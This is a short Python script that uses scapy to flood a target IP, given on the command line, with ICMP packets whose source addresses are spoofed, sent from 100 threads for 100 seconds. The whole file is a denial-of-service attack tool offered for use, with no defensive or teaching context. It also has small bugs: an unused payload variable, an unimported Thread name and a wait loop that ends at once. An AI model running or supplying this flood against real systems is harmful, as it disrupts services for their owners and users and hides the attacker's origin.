from scapy.all import *
import sys, threading, time

def flood_ping(dst_ip, payload, timeout):
    start_time = time.time()
    while time.time() - start_time < timeout:
        ip = IP(dst = dst_ip, src = RandIP('192.168.1.1/24'))/ICMP()
        send(ip,verbose=0)
        print(ip.summary())

if __name__ == '__main__':
    dst_ip = sys.argv[1]
    payload = 'spam'*1000
    #Timeout in secs
    spam_timeout = 100
    threads = []
    for x in range(100):
        thread = Thread(target=flood_ping, args=(dst_ip,payload,spam_timeout),daemon=True)
        thread.start()
        threads.append(thread)
    
    try:
        while True:
            for thread in threads:
                if thread.is_alive():
                    continue
            break
    except KeyboardInterrupt:
        exit()


